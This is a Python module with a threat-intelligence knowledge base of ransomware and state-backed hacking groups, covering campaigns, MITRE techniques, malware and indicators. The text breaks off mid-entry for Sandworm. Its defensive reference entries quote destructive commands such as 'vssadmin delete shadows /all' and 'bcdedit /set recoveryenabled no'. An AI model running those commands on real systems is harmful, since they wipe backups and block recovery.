"""
Threat actor / campaign knowledge base.
Provides verified facts from public reports (Volexity, Unit 42, CISA)
to ground model responses on threat intelligence queries.
"""

import re

# ── Knowledge base ────────────────────────────────────────────────────────────
# Each entry has: names (aliases the actor/campaign is known by),
# keywords (additional trigger words), and a FACTS block injected into prompt.

THREAT_INTEL_DB = [
    # ── APT28 / Fancy Bear ────────────────────────────────────────────────────
    {
        "names": [
            "apt28", "fancy bear", "sofacy", "pawn storm", "sednit",
            "strontium", "forest blizzard", "iron twilight",
        ],
        "keywords": [
            "x-agent", "x-tunnel", "zebrocy", "drovorub", "komplex",
            "dnc hack", "dnc.*2016", "bundestag.*hack", "wada.*hack",
            "gru.*unit 26165", "unit 26165",
        ],
        "facts": """[VERIFIED THREAT INTEL — APT28 / Fancy Bear / Sofacy]
Source: CrowdStrike, Mandiant, CISA, NSA, DOJ Indictment (2018)

Actor: APT28 (Mandiant) | Fancy Bear (CrowdStrike) | Sofacy | Strontium (Microsoft) | Forest Blizzard
Attribution: Russia GRU Unit 26165 (85th GTsSS)
MITRE ATT&CK Group ID: G0007
Active since: ~2004

TARGETS:
- NATO governments, military, and defence organisations
- Political parties and election infrastructure (US, France, Germany)
- International sports organisations (WADA, IOC)
- Media and journalism

NOTABLE CAMPAIGNS:
- DNC / DCCC hack (2016): Spearphishing + X-Agent keylogger exfiltrated 50,000+ emails
- German Bundestag hack (2015): 16 GB of parliamentary data stolen
- WADA hack (2016): Olympic athlete medical records leaked via dcleaks.com / Fancy Bears site
- Operation Grizzly Steppe: Multi-phase US election infrastructure targeting

MITRE ATT&CK TTPs:
- T1566.001 Spearphishing Attachment
- T1078 Valid Accounts (stolen credentials via phishing kits)
- T1003 OS Credential Dumping (Mimikatz)
- T1027 Obfuscated Files or Information
- T1190 Exploit Public-Facing Application
- T1041 Exfiltration Over C2 Channel
- T1071.001 Application Layer Protocol: Web Protocols

MALWARE / TOOLSET:
- X-Agent (Sofacy): cross-platform keylogger and file exfiltrator (Windows, Linux, iOS)
- X-Tunnel: encrypted network tunnelling tool
- Zebrocy: Delphi/Go downloader used for initial access
- Drovorub: Linux kernel rootkit and C2 implant (NSA/FBI advisory, Aug 2020)
- Komplex: macOS backdoor targeting aerospace sector
- Custom credential-harvesting phishing kits (myaccount.google.com clones, etc.)

KEY INDICATORS:
- X-Agent beacon traffic: HTTP POST to hardcoded IPs on port 80/443 with XOR-encoded payloads
- Zebrocy: frequent short-interval C2 polling (every 15–60 seconds)
- Drovorub: kernel module "vt_" prefix, hides files and processes from userland
[END THREAT INTEL]""",
    },

    # ── APT29 / Cozy Bear / NOBELIUM ─────────────────────────────────────────
    {
        "names": [
            "apt29", "cozy bear", "nobelium", "midnight blizzard",
            "the dukes", "iron hemlock", "yttrium", "cozy duke",
        ],
        "keywords": [
            "sunburst", "solarwinds.*attack", "solarwinds.*supply chain",
            "wellmess", "miniduke", "cosmicduke", "hammertoss",
            "svr.*hack", "svr.*cyber", "orion.*backdoor",
        ],
        "facts": """[VERIFIED THREAT INTEL — APT29 / Cozy Bear / NOBELIUM]
Source: FireEye (Dec 2020), Microsoft MSTIC, CISA AA20-352A, Volexity

Actor: APT29 (Mandiant) | Cozy Bear (CrowdStrike) | NOBELIUM (Microsoft) | Midnight Blizzard
Attribution: Russia SVR (Foreign Intelligence Service)
MITRE ATT&CK Group ID: G0016
Active since: ~2008

TARGETS:
- Western diplomatic missions and foreign ministries
- Government agencies and think tanks (US, EU, NATO members)
- Healthcare and COVID-19 vaccine research organisations (2020)
- Technology and cloud service providers

NOTABLE CAMPAIGNS:
- SolarWinds supply chain attack (2020): Trojanised SolarWinds Orion update (SUNBURST)
  affected 18,000 organisations including US Treasury, DHS, State Department
- DNC intrusion (2015–2016): Separate intrusion from APT28; stealthy long-term access
- COVID-19 vaccine theft (2020): Targeted UK, US, Canadian pharma labs (WellMess malware)
- Microsoft corporate email breach (2024): Password-spray → OAuth token abuse → executive mailbox access

MITRE ATT&CK TTPs:
- T1195.002 Supply Chain Compromise: Software Supply Chain
- T1078 Valid Accounts (cloud and on-prem)
- T1027 Obfuscated Files or Information (SUNBURST used steganographic C2 via DNS)
- T1071.004 Application Layer Protocol: DNS (SUNBURST C2 via DNS A/CNAME records)
- T1550.001 Use Alternate Authentication Material: Application Access Token
- T1552 Unsecured Credentials
- T1087 Account Discovery

MALWARE / TOOLSET:
- SUNBURST: DLL backdoor injected into SolarWinds Orion (avsvmcloud[.]com C2)
- TEARDROP / RAINDROP: in-memory Cobalt Strike loaders used post-SUNBURST
- WellMess / WellMail: Go/C# implants used in vaccine-research targeting
- MiniDuke / CozyDuke / HammerDuke: early-generation modular espionage frameworks
- HAMMERTOSS: Twitter/GitHub-based C2 — read tweets for steganographic commands

KEY INDICATORS:
- SUNBURST: DLL named SolarWinds.Orion.Core.BusinessLayer.dll with embedded backdoor
- DNS beacon to avsvmcloud[.]com subdomains (CNAME C2 redirect)
- Abnormal OAuth token grants; service principal creation in Azure AD
- WellMess: TLS with self-signed certs; HTTP POST to /favicon.ico or /static/
[END THREAT INTEL]""",
    },

    # ── Lazarus Group / Hidden Cobra ──────────────────────────────────────────
    {
        "names": [
            "lazarus group", "lazarus", "hidden cobra", "zinc",
            "diamond sleet", "apt38", "whois team", "guardians of peace",
        ],
        "keywords": [
            "wannacry", "bangladesh bank", "sony pictures.*hack",
            "ronin network", "axie infinity.*hack",
            "blindingcan", "applejeus", "manuscrypt", "ratankba",
            "dprk.*cyber", "north korea.*hack",
        ],
        "facts": """[VERIFIED THREAT INTEL — Lazarus Group / Hidden Cobra]
Source: US-CERT AA20-239A, DOJ Indictment (2021), Kaspersky, CISA

Actor: Lazarus Group | Hidden Cobra (US-CERT) | ZINC (Microsoft) | Diamond Sleet
Attribution: North Korea — Reconnaissance General Bureau (RGB)
MITRE ATT&CK Group ID: G0032
Active since: ~2007

TARGETS:
- Cryptocurrency exchanges and DeFi protocols (primary financial motivation)
- Global financial institutions (SWIFT network)
- Defence contractors and aerospace (espionage)
- Entertainment and media

NOTABLE CAMPAIGNS:
- Sony Pictures hack (2014): Destructive wiper (Destover), 100TB exfiltrated, ransom demand
- Bangladesh Bank SWIFT heist (2016): $81M stolen via fraudulent SWIFT messages
- WannaCry ransomware (2017): ~$4B in global damages, attributed by US/UK governments
- Ronin Network / Axie Infinity hack (2022): $620M in crypto stolen (largest DeFi theft)
- 3CX supply chain attack (2023): Trojanised VoIP client targeting crypto firms

MITRE ATT&CK TTPs:
- T1195.002 Supply Chain Compromise
- T1059 Command and Scripting Interpreter
- T1486 Data Encrypted for Impact (WannaCry)
- T1565 Data Manipulation (SWIFT transaction fraud)
- T1566 Phishing (spearphishing of crypto/finance employees)
- T1190 Exploit Public-Facing Application
- T1070 Indicator Removal on Host

MALWARE / TOOLSET:
- WannaCry: EternalBlue-based ransomworm (EternalBlue / DoublePulsar)
- BLINDINGCAN / AIRDRY: modular Windows RAT (CISA advisory Aug 2020)
- AppleJeus: fake crypto trading app dropping macOS/Windows backdoor
- Manuscrypt / NukeSped: multi-stage RAT with keylogging and screenshot capture
- RATANKBA: PowerShell-based downloader used in bank targeting
- Destover: destructive wiper used in Sony Pictures attack

KEY INDICATORS:
- AppleJeus: legitimate-looking crypto app installer with embedded backdoor dylib
- WannaCry: killswitch domain check (iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com)
- BLINDINGCAN: HTTP C2 with AES-256-CBC encrypted payloads; User-Agent spoofing
- SWIFT fraud: anomalous after-hours SWIFT MT103 messages, especially to Bangladesh/Sri Lanka
[END THREAT INTEL]""",
    },

    # ── APT41 / Winnti / Barium ───────────────────────────────────────────────
    {
        "names": [
            "apt41", "winnti", "barium", "double dragon",
            "wicked panda", "brass typhoon", "earth baku",
        ],
        "keywords": [
            "shadowpad", "messagetap", "ccleaner.*supply chain",
            "apt41.*gaming", "winnti.*group",
            "plugx.*apt41", "china.*dual.*espionage",
        ],
        "facts": """[VERIFIED THREAT INTEL — APT41 / Winnti / Barium]
Source: Mandiant APT41 Report (2019), DOJ Indictments (2020), CISA

Actor: APT41 (Mandiant) | Winnti Group | Barium (Microsoft) | Double Dragon | Wicked Panda
Attribution: China — contractors affiliated with Ministry of State Security (MSS)
MITRE ATT&CK Group ID: G0096
Active since: ~2012

TARGETS:
- Video game companies (source code and virtual currency theft)
- Healthcare and pharmaceuticals (COVID-19 era)
- Technology and managed service providers
- Telecommunications carriers
- Governments in South/Southeast Asia

NOTABLE CAMPAIGNS:
- CCleaner supply chain (2017, via Winnti sub-group): 2.27M users compromised; second-stage
  payload delivered only to ~40 high-value targets (Intel, Microsoft, Samsung, Sony)
- ShadowPad (ongoing): shared backdoor platform distributed to multiple Chinese APT groups
- COVID-19 pharma targeting (2020): spearphishing against vaccine manufacturers
- Citrix / Cisco / Zoho exploitation wave (2021): mass exploitation within hours of PoC release

MITRE ATT&CK TTPs:
- T1195.002 Supply Chain Compromise (CCleaner, SolarWinds-analogous)
- T1059 Command and Scripting Interpreter (PowerShell, Python, Lua loaders)
- T1078 Valid Accounts (stolen credentials from previous intrusions)
- T1027 Obfuscated Files or Information (encrypted shellcode blobs)
- T1190 Exploit Public-Facing Application (rapid N-day exploitation)
- T1055 Process Injection (ShadowPad injected into legitimate processes)

MALWARE / TOOLSET:
- ShadowPad: modular plugin-based backdoor; successor to PlugX; shared across MSS contractors
- Winnti (malware): kernel-level rootkit with signed driver; steals signing certificates
- MESSAGETAP: malware deployed on SMS gateways to intercept SMS messages of HVTs
- PlugX: long-running RAT used across multiple Chinese APT groups
- Cobalt Strike: used post-exploitation across multiple campaigns

KEY INDICATORS:
- ShadowPad: DLL side-loading into legitimate apps (e.g., svchost.exe, spoolsv.exe)
- Winnti rootkit: kernel driver with stolen legitimate code-signing certificate
- MESSAGETAP: deployed on Linux SMSC servers; reads SMS PDUs matching keyword/IMSI lists
- Rapid exploitation of CVEs within 1–7 days of PoC publication
[END THREAT INTEL]""",
    },

    # ── APT34 / OilRig ────────────────────────────────────────────────────────
    {
        "names": [
            "apt34", "oilrig", "helix kitten", "crambus",
            "cobalt gypsy", "irn2", "hazel sandstorm", "chrysene",
        ],
        "keywords": [
            "dnspionage", "powruner", "bondupdater", "helminth",
            "karkoff", "sidetwist", "rdat.*iran",
            "iran.*energy.*hack", "middle east.*apt",
        ],
        "facts": """[VERIFIED THREAT INTEL — APT34 / OilRig / Helix Kitten]
Source: FireEye (2017), Palo Alto Unit 42, ClearSky, leaked APT34 tools (2019)

Actor: APT34 (FireEye) | OilRig (Unit 42) | Helix Kitten (CrowdStrike) | Crambus | Hazel Sandstorm
Attribution: Iran — likely Ministry of Intelligence and Security (MOIS)
MITRE ATT&CK Group ID: G0049
Active since: ~2014

TARGETS:
- Energy sector (oil & gas, utilities) in Middle East
- Financial institutions in Gulf Cooperation Council countries
- Government ministries in Middle East, US, and Europe
- Telecoms and technology companies

NOTABLE CAMPAIGNS:
- DNSpionage (2018–2019): DNS hijacking campaign redirected gov/telco domains to actor-controlled
  servers to harvest credentials; affected Lebanon, UAE, US government domains
- Fox Kitten (2019–2020, shared infrastructure): exploitation of Pulse Secure, Fortinet, Citrix
  VPN vulnerabilities for initial access
- APT34 tool leak (2019): full source code of custom tools leaked on Telegram by Lab Dookhtegan

MITRE ATT&CK TTPs:
- T1566.001 Spearphishing Attachment (macro-laced Office documents)
- T1071.004 Application Layer Protocol: DNS (DNS tunnelling C2)
- T1059 Command and Scripting Interpreter (PowerShell, Python)
- T1027 Obfuscated Files or Information
- T1016 System Network Configuration Discovery
- T1056 Input Capture (credential harvesting portals)
- T1133 External Remote Services (VPN exploitation)

MALWARE / TOOLSET:
- POWRUNER: PowerShell-based backdoor communicating via DNS TXT records
- BONDUPDATER: PowerShell downloader; updates via DNS TXT records (DNSpionage)
- Helminth: VBS/PowerShell implant with DNS and HTTP C2 channels
- Karkoff: lightweight .NET implant deployed after Helminth
- SideTwist: C-based backdoor using HTTP C2 with randomised beacon intervals
- RDAT: Exchange Web Services (EWS) backdoor using email as C2 channel

KEY INDICATORS:
- DNS TXT record C2: short base64 strings in TXT responses to actor-controlled subdomains
- Helminth: scheduled task named "Reset_GSetting" or "Microsoft_Compat_Telemetry"
- POWRUNER: encoded PowerShell one-liners executed from registry Run keys
- EWS-based C2: unexpected mail rules forwarding copies to external addresses
[END THREAT INTEL]""",
    },

    # ── FIN7 / Carbanak ───────────────────────────────────────────────────────
    {
        "names": [
            "fin7", "carbanak", "navigator group", "itg14",
            "sangria tempest",
        ],
        "keywords": [
            "carbanak.*malware", "fin7.*pos", "fin7.*restaurant",
            "halfbaked", "pillowmint", "boostwrite", "birddog",
            "fin7.*hospitality", "fin7.*retail",
        ],
        "facts": """[VERIFIED THREAT INTEL — FIN7 / Carbanak]
Source: FireEye, FBI Flash MC-000075-MW, DOJ Indictments (2018), Mandiant

Actor: FIN7 (Mandiant/FireEye) | Carbanak Group | Navigator Group | ITG14 (IBM)
Attribution: Eastern Europe (Russian-speaking); significant arrests made in Ukraine/Spain 2018
MITRE ATT&CK Group ID: G0046
Active since: ~2013

TARGETS:
- Hospitality chains (hotels, casinos)
- Restaurant and fast-food chains
- Retail and payment card processing environments
- Financial institutions (Carbanak sub-group)

NOTABLE CAMPAIGNS:
- Carbanak bank heist campaign (2013–2018): $1B+ stolen from 100+ banks in 30 countries
  via fraudulent SWIFT/ATM cashout operations
- Restaurant chain attacks: Chipotle (2017), Arby's, Red Robin, Chili's — POS malware
  harvested 15M+ payment cards per incident
- Saks Fifth Avenue / Lord & Taylor (2018): 5M payment cards stolen via BOOSTWRITE
- Fake cybersecurity company "Combi Security" used to recruit unwitting pen testers

MITRE ATT&CK TTPs:
- T1566.001 Spearphishing Attachment (highly targeted Word/Excel macros)
- T1059 Command and Scripting Interpreter (PowerShell, JavaScript)
- T1055 Process Injection (HALFBAKED injected into msiexec.exe)
- T1003 OS Credential Dumping (Mimikatz, custom variants)
- T1056.001 Keylogging (POS terminal memory scraping)
- T1071 Application Layer Protocol (HTTPS C2)
- T1486 Data Encrypted for Impact (ransomware in later campaigns)

MALWARE / TOOLSET:
- Carbanak: full-featured backdoor; keylogging, video capture, SWIFT transaction manipulation
- HALFBAKED: JavaScript/PowerShell backdoor; fileless execution via msiexec.exe injection
- PILLOWMINT: POS memory-scraping malware targeting Track 1/2 card data
- BOOSTWRITE: DLL hijacking loader that decrypts and runs Carbanak / RDFSNIFFER in-memory
- Birddog (DRIFTPIN): reverse-shell backdoor distributed after BOOSTWRITE
- Cobalt Strike: used extensively post-2017 for lateral movement

KEY INDICATORS:
- HALFBAKED: msiexec.exe spawning PowerShell with encoded commands
- PILLOWMINT: injected into POS process memory; reads card data from RAM
- Spearphishing: highly personalised emails referencing specific menu items or job postings
- BOOSTWRITE: legitimate app DLL search-order hijacking (e.g., dwrite.dll in app directory)
[END THREAT INTEL]""",
    },

    # ── Conti ─────────────────────────────────────────────────────────────────
    {
        "names": [
            "conti", "wizard spider", "conti ransomware",
        ],
        "keywords": [
            "conti.*ransomware", "conti.*leak", "conti.*playbook",
            "costa rica.*ransomware", "hse.*ransomware", "hse.*ireland",
            "trickbot.*conti", "bazarloader", "conti.*healthcare",
        ],
        "facts": """[VERIFIED THREAT INTEL — Conti Ransomware Group]
Source: CISA AA21-265A, CISA AA22-228A, Conti leaks analysis (Feb 2022), NCSC

Actor: Conti (Ransomware-as-a-Service) | Operated by Wizard Spider
Attribution: Russia-based cybercriminal organisation
MITRE ATT&CK Group ID: G0102
Active: 2020 – May 2022 (disbanded; splinter groups: Black Basta, Royal, BazarCall)

TARGETS:
- Healthcare and emergency services (FBI warned of 400+ attacks on US healthcare)
- Critical infrastructure and government agencies
- Manufacturing and industrial organisations
- Schools and universities

NOTABLE CAMPAIGNS:
- HSE Ireland (May 2021): Fully shut down Irish national health service IT systems;
  ransom demanded ~€20M; decryption key eventually provided gratis under public pressure
- Costa Rica government (April–May 2022): Declared national emergency; 27 government
  agencies compromised; Conti demanded $20M, later $10M
- Conti playbook leak (Aug 2021): Disgruntled affiliate leaked internal training manuals,
  tools, and negotiation scripts
- Conti chat logs leak (Feb 2022): ~160,000 internal Jabber messages leaked after Conti
  publicly sided with Russia post-Ukraine invasion; exposed full org structure

MITRE ATT&CK TTPs:
- T1566 Phishing (BazarLoader / TrickBot initial access)
- T1059 Command and Scripting Interpreter (PowerShell, cmd.exe)
- T1486 Data Encrypted for Impact (AES-256 + RSA-4096 encryption)
- T1490 Inhibit System Recovery (VSS deletion: vssadmin delete shadows /all)
- T1489 Service Stop (stops backup and AV services pre-encryption)
- T1070.004 File Deletion (removes ransomware binary post-encryption)
- T1083 File and Directory Discovery (targets NAS, backup servers)

MALWARE / TOOLSET:
- Conti ransomware: multi-threaded encryptor; uses I/O completion ports for speed
- TrickBot: primary initial-access malware; banking trojan repurposed as loader
- BazarLoader / BazarBackdoor: stealthy HTTPS-based loader; C2 via Emercoin DNS (.bazar)
- Cobalt Strike: lateral movement and C2 across compromised networks
- Ryuk (predecessor): shared Wizard Spider codebase; Conti is Ryuk's successor

KEY INDICATORS:
- Ransom note: "CONTI_README.txt" or "readme.txt" in each encrypted directory
- VSS deletion via vssadmin / wmic within minutes of encryption start
- BazarLoader: signed PE with revoked certificate; C2 to .bazar Emercoin domains
- Conti C2: Cobalt Strike beacons on non-standard ports (e.g., 443, 8443, 4444)
[END THREAT INTEL]""",
    },

    # ── LockBit ───────────────────────────────────────────────────────────────
    {
        "names": [
            "lockbit", "lockbit 2.0", "lockbit 3.0", "lockbit black",
            "lockbit green",
        ],
        "keywords": [
            "lockbit.*ransomware", "stealbit",
            "icbc.*ransomware", "royal mail.*ransomware",
            "boeing.*ransomware", "lockbit.*leak",
            "operation cronos", "lockbit.*disruption",
        ],
        "facts": """[VERIFIED THREAT INTEL — LockBit Ransomware-as-a-Service]
Source: CISA AA23-165A, NCA/Europol Operation Cronos (Feb 2024), FBI

Actor: LockBit (Ransomware-as-a-Service); core developers believed to be Russia-based
Aliases: LockBit 2.0, LockBit 3.0 (LockBit Black), LockBit Green (Conti code reuse)
MITRE ATT&CK Group ID: G1030
Active: 2019 – disrupted February 2024 (Operation Cronos); attempted resurrection ongoing

TARGETS:
- All sectors globally; explicitly prohibited: CIS countries, healthcare in some ads
- High-profile 2023 targets: ICBC (Chinese bank), Boeing, Royal Mail (UK), Ion Group

NOTABLE CAMPAIGNS:
- ICBC ransomware (Nov 2023): Disrupted US Treasury bond settlement; trades cleared manually
- Royal Mail UK (Jan 2023): Halted international parcel deliveries; £65M demanded
- Boeing (Oct 2023): 43GB of data published after Boeing declined to pay
- Operation Cronos (Feb 2024): NCA/FBI/Europol seized LockBit infrastructure, 34 servers,
  200+ crypto wallets, 1,000 decryption keys; indicted LockBit admin "LockBitSupp"

MITRE ATT&CK TTPs:
- T1486 Data Encrypted for Impact (AES-128 + RSA encryption; intermittent for speed)
- T1490 Inhibit System Recovery (VSS deletion, bcdedit /set recoveryenabled no)
- T1078 Valid Accounts (RDP brute-force or purchased access from IABs)
- T1133 External Remote Services (exploitation of Fortinet FortiOS, Citrix Bleed CVE-2023-4966)
- T1027 Obfuscated Files or Information (LockBit 3.0 code obfuscation via llvm-obfuscator)
- T1657 Financial Theft (double-extortion: encrypt + exfil + publish)

MALWARE / TOOLSET:
- LockBit 3.0 (LockBit Black): incorporates BlackMatter code; pass-phrase required to run
  (anti-analysis); intermittent encryption skips portions of large files for speed
- StealBit: custom data exfiltration tool; fastest exfil tool measured in comparative tests
- LockBit 2.0: propagates via Active Directory Group Policy; auto-deploys to network shares
- Affiliate tooling: Cobalt Strike, Metasploit, various commercial RATs

KEY INDICATORS:
- Ransom note: "Restore-My-Files.txt" (2.0) or randomised extension + README (3.0)
- LockBit 3.0 requires command-line passphrase: lockbit3.exe -pass <key> (prevents sandbox detonation)
- StealBit: large outbound data transfers over HTTPS before encryption begins
- LockBit 2.0: Group Policy modification to run encryptor on all domain-joined machines
[END THREAT INTEL]""",
    },

    # ── ALPHV / BlackCat ──────────────────────────────────────────────────────
    {
        "names": [
            "alphv", "blackcat", "noberus", "alphv blackcat",
            "blackcat ransomware",
        ],
        "keywords": [
            "blackcat.*ransomware", "alphv.*ransomware",
            "change healthcare.*ransomware", "change healthcare.*attack",
            "mgm.*alphv", "caesars.*ransomware",
            "rust.*ransomware",
        ],
        "facts": """[VERIFIED THREAT INTEL — ALPHV / BlackCat Ransomware]
Source: CISA AA23-353A, FBI Flash CU-000167-MW, Microsoft MSTIC

Actor: ALPHV (self-designation) | BlackCat (Microsoft/security community) | Noberus (Symantec)
Attribution: Russia-based RaaS; formerly linked to DarkSide / BlackMatter lineage
MITRE ATT&CK Group ID: G1016
Active: November 2021 – FBI disruption Dec 2023; rebranded/collapsed early 2024

TARGETS:
- Healthcare and critical infrastructure (US government warning, 2024)
- Energy sector
- Financial services
- Casinos and hospitality (via Scattered Spider affiliates)

NOTABLE CAMPAIGNS:
- Change Healthcare (Feb 2024): Largest US healthcare payment processor crippled;
  $22M ransom paid; 100M+ patient records exposed (UnitedHealth Group subsidiary)
- MGM Resorts (Sep 2023, via Scattered Spider affiliate): $100M+ in losses; slot machines,
  hotel check-in systems offline for 10 days
- Caesars Entertainment (Aug 2023): ~$15M ransom paid quietly; customer loyalty DB stolen
- Western Digital (Apr 2023): 10TB of data exfiltrated; extortion via fake GDPR complaints

MITRE ATT&CK TTPs:
- T1486 Data Encrypted for Impact (ChaCha20 + RSA-4096; Salsa20 variant per config)
- T1490 Inhibit System Recovery (esxcli on VMware ESXi to shut down VMs pre-encryption)
- T1078 Valid Accounts (purchased access from IABs; Scattered Spider via MFA fatigue)
- T1133 External Remote Services (Citrix Bleed CVE-2023-4966, PulseSecure vulns)
- T1621 Multi-Factor Authentication Request Generation (via Scattered Spider affiliates)
- T1657 Financial Theft (triple extortion: encrypt + exfil + victim-customer notification)

MALWARE / TOOLSET:
- ALPHV encryptor: written in Rust; cross-platform (Windows, Linux, VMware ESXi);
  highly configurable JSON config (target extensions, exclusions, propagation mode)
- ExMatter: .NET exfiltration tool that uploads files to actor-controlled SFTP/WebDAV
- Fendr: data exfiltration tool (used in energy sector attacks)
- Cobalt Strike / Brute Ratel C4: post-exploitation C2

KEY INDICATORS:
- ALPHV: ESXi attacks — VM snapshots deleted; all VMs encrypted with .alphv extension
- ExMatter: HTTPS POST of archive chunks to actor WebDAV; chunked Transfer-Encoding
- Ransom note: "RECOVER-[extension]-FILES.txt" with .onion negotiation URL
- Rust binary: stripped symbols; encrypted configuration appended to PE overlay
[END THREAT INTEL]""",
    },

    # ── Volt Typhoon ──────────────────────────────────────────────────────────
    {
        "names": [
            "volt typhoon", "bronze silhouette", "vanguard panda",
            "dev-0391", "kv botnet",
        ],
        "keywords": [
            "volt typhoon.*infrastructure", "living.off.the.land.*china",
            "lotl.*critical infrastructure", "kv.botnet",
            "china.*power grid", "china.*water.*hack",
            "china.*prepositioning",
        ],
        "facts": """[VERIFIED THREAT INTEL — Volt Typhoon]
Source: CISA AA23-144A, CISA AA24-038A, Microsoft MSTIC (May 2023), NSA

Actor: Volt Typhoon (Microsoft) | Bronze Silhouette (Secureworks) | Vanguard Panda (CrowdStrike)
Attribution: China — People's Liberation Army (PLA) or MSS; assessed with high confidence
MITRE ATT&CK Group ID: G1017
Active since: ~2021 (activity assessed as ongoing and expanding)

TARGETS:
- US critical infrastructure: communications, energy, transportation, water/wastewater
- Guam military installations (US Pacific Command area of operations)
- Focus on pre-positioning for potential conflict disruption, not immediate espionage

NOTABLE CAMPAIGNS:
- US Critical Infrastructure Pre-positioning (2021–2024): CISA confirmed presence in
  US electric grid, water utilities, and communications networks for 5+ years in some cases
- Guam targeting (2023): Microsoft identified persistent access to organisations in Guam,
  a key US military logistics hub for Pacific operations
- KV Botnet (2023–2024): Compromised hundreds of US SOHO routers/VPN devices (Cisco RV,
  Netgear ProSAFE, Fortinet) to proxy traffic and obscure origin

MITRE ATT&CK TTPs:
- T1078 Valid Accounts (stolen admin credentials; living-off-the-land)
- T1133 External Remote Services (VPN and remote access exploitation)
- T1036 Masquerading (rename tools to match legitimate Windows binaries)
- T1070 Indicator Removal on Host (clear event logs; delete artefacts)
- T1571 Non-Standard Port (proxy traffic through compromised routers)
- T1016 System Network Configuration Discovery (netsh, ipconfig, route)
- T1049 System Network Connections Discovery (netstat)
- T1560 Archive Collected Data (data staged via ntdsutil, esentutl)

MALWARE / TOOLSET:
- Minimal custom malware — deliberately uses only built-in Windows tools (LOLBins):
  wmic, ntdsutil, netsh, PowerShell, certutil, msiexec, cmd.exe
- KV Botnet C2 infrastructure: compromised Cisco/Netgear/Fortinet SOHO devices as relay nodes
- Impacket (open-source): used for SMB/DCOM lateral movement
- Fast Reverse Proxy (FRP): open-source; used to tunnel C2 through compromised edge devices

KEY INDICATORS:
- Absence of custom malware — LOLBin-only chains are a key behavioural signature
- Abnormal ntdsutil commands for AD snapshot creation
- Unexpected outbound connections from OT/ICS network segments to edge router IPs
- SOHO router compromise: new admin accounts, unexpected config changes, outbound tunnels
[END THREAT INTEL]""",
    },

    # ── Scattered Spider / UNC3944 ────────────────────────────────────────────
    {
        "names": [
            "scattered spider", "unc3944", "muddled libra",
            "0ktapus", "octo tempest", "starfraud",
        ],
        "keywords": [
            "mgm.*hack", "mgm.*ransomware", "mgm.*breach",
            "scattered spider.*caesars", "caesars.*ransomware",
            "okta.*smishing", "0ktapus",
            "sim swapping.*apt", "vishing.*it helpdesk", "mfa.*fatigue",
        ],
        "facts": """[VERIFIED THREAT INTEL — Scattered Spider / UNC3944]
Source: Mandiant UNC3944, CrowdStrike, CISA AA23-320A, FBI (Nov 2023)

Actor: Scattered Spider (CrowdStrike) | UNC3944 (Mandiant) | Muddled Libra (Unit 42)
       0ktapus (Group-IB, 2022 campaign) | Octo Tempest (Microsoft)
Attribution: English-speaking cybercriminals; members in US, UK; ages 16–22 at peak activity
MITRE ATT&CK Group ID: G1015
Active since: ~2022 (ongoing; several members arrested 2023–2024)

TARGETS:
- Large technology companies and MSPs (Okta, Microsoft, Twilio, Cloudflare)
- Telecommunications carriers (T-Mobile, AT&T — for SIM swapping)
- Hospitality and casino operators
- Business Process Outsourcing (BPO) firms

NOTABLE CAMPAIGNS:
- 0ktapus campaign (Jun–Sep 2022): SMS phishing of 130+ companies; harvested 9,931
  Okta credentials and 5,441 MFA codes; compromised Twilio, Cloudflare, Signal
- MGM Resorts (Sep 2023): 10-minute LinkedIn OSINT + vishing call to IT helpdesk;
  obtained credentials; deployed ALPHV ransomware; ~$100M in losses
- Caesars Entertainment (Aug 2023): Vished a third-party IT vendor; paid ~$15M ransom
- Okta support system breach (Oct 2023): Stole customer support tickets for 134 customers

MITRE ATT&CK TTPs:
- T1566.004 Spearphishing via SMS (smishing; fake Okta login pages)
- T1621 Multi-Factor Authentication Request Generation (MFA push fatigue bombing)
- T1078 Valid Accounts (credentials harvested from phishing portals)
- T1556 Modify Authentication Process (SIM swapping to receive OTP codes)
- T1534 Internal Spearphishing (pivots to email systems to phish internal employees)
- T1485 Data Destruction / T1486 Ransomware (via ALPHV/BlackCat affiliate access)
- T1590 Gather Victim Network Information (extensive OSINT via LinkedIn, breach databases)

MALWARE / TOOLSET:
- Custom phishing kits: real-time AiTM (Adversary-in-the-Middle) Okta credential portals
- ALPHV/BlackCat ransomware: deployed as final-stage payload in casino attacks
- Qilin ransomware: used in some UNC3944 operations
- SpecterInsight RAT: .NET-based; used for persistent access post-initial compromise
- AnyDesk / TeamViewer: abused for legitimate remote access persistence

KEY INDICATORS:
- IT helpdesk vishing: caller claims to be new/remote employee; requests password reset + MFA
- MFA push fatigue: 20–50 consecutive Duo/Microsoft Authenticator pushes overnight
- New Okta SSO apps registered from unusual geolocation within minutes of credential theft
- SIM swap: victim's phone loses signal; attacker receives SMS OTPs
[END THREAT INTEL]""",
    },

    # ── Sandworm / Voodoo Bear ────────────────────────────────────────────────
    {
        "names": [
            "sandworm", "voodoo bear", "blackenergy group",
            "electrum", "iridium", "seashell blizzard",
            "sandworm team",
        ],
        "keywords": [
            "notpetya", "industroyer", "crashoverride",
            "ukraine.*power.*grid", "ukraine.*blackout",
            "olympic destroyer", "cyclops blink", "whispergate.*sandworm",
            "gru.*unit 74455", "unit 74455",
        ],
        "facts": """[VERIFIED THREAT INTEL — Sandworm / Voodoo Bear]
Source: CISA AA20-296A, Dragos CRASHOVERRIDE report, DOJ Indictment (Oct 2020), ESET

Actor: Sandworm (iSight/Mandiant) | Voodoo Bear (CrowdStrike) | IRIDIUM (Microsoft) | Seashell Blizzard
Attribution: Russia GRU Unit 74455 (Main Centre for Special Technologies — GTsST)
MITRE ATT&CK Group ID: G0034
Active since: ~2009

TARGETS:
- Ukraine government, military, and critical infrastructure (ongoing)
- NATO member energy and industrial control systems
- Election infrastructure and media organisations
- Olympic Games IT systems

NOTABLE CAMPAIGNS:
- Ukraine power grid blackout (Dec 2015): First confirmed cyberattack to cause power outage;
  225,000 customers lost power; BlackEnergy + KillDisk used
- Ukraine power grid blackout (Dec 2016): INDUSTROYER/CRASHOVERRIDE ICS malware caused
  1-hour outage in Kyiv; first malware designed to directly control ICS/SCADA equipment
- NotPetya (Jun 2017): Disguised as ransomware; pure wiper; spread via MeDoc update;
  caused ~$10B global damage (Maersk, Merck, FedEx, Mondelēz); most costly cyberattack ever
- Olympic Destroyer (Feb 2018): Sabotaged 2018 Pyeongchang Winter Olympics opening ceremony;
  false-flag attribution artifacts planted
- Industroyer2 (Apr 2022): Second-generation ICS malware deployed against Ukrainian high-voltage
  substations; disrupted by CERT-UA before execution

MITRE ATT&CK TTPs:
- T1561 Disk Wipe (NotPetya, KillDisk — overwrite MBR and files)
